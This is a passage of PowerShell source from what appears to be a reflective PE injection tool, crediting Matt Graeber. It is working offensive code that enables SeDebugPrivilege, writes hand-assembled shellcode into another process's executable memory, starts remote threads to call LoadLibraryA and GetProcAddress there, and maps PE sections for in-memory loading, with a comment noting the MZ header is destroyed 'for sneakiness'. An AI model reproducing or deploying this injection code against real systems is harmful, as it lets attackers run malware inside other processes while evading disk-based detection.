		$MethodBuilder.SetImplementationFlags('Runtime, Managed')
		
		Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
		Param
		(
			[OutputType([IntPtr])]
		
			[Parameter( Position = 0, Mandatory = $True )]
			[String]
			$Module,
			
			[Parameter( Position = 1, Mandatory = $True )]
			[String]
			$Procedure
		)

		# Get a reference to System.dll in the GAC
		$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
			Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
		$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
		# Get a reference to the GetModuleHandle and GetProcAddress methods
		$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
		$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
		# Get a handle to the module specified
		$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
		$tmpPtr = New-Object IntPtr
		$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

		# Return the address of the function
		Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
		if ($imageNtHeaders64.Signature -ne 0x00004550)
		{
			throw "Invalid IMAGE_NT_HEADER signature."
		}
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

		[Parameter(Position=3, Mandatory=$true)]
		[Bool]
		$LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
		#If not loading by ordinal, write the function name to the remote process memory
		if (-not $LoadByOrdinal)
		{
			$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

			#Write FunctionName to memory (will be used in GetProcAddress)
			$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
			$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($RFuncNamePtr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process"
			}

			[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write DLL path to remote process memory"
			}
			if ($FunctionNameSize -ne $NumBytesWritten)
			{
				Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
			}
		}
		#If loading by ordinal, just set RFuncNamePtr to be the ordinal number
		else
		{
			$RFuncNamePtr = $FunctionNamePtr
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		#Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

		if (-not $LoadByOrdinal)
		{
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
